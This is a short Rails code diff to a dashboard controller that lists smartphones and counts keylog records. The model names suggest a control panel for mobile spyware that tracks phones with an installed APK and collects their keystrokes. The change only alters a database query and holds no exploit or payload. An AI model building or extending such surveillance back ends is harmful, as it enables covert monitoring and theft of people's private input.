@@ -1,6 +1,6 @@
 class DashboardsController < ActionController::Base
   def index
-    @devices = Smartphone.joins(:apk_installation).where("apk_installations.status = 'installed'")
+    @devices = Smartphone.all.order(updated_at: :desc)
     @stats = {
       devices: @devices.count,
       keylogs: Keylog.count,
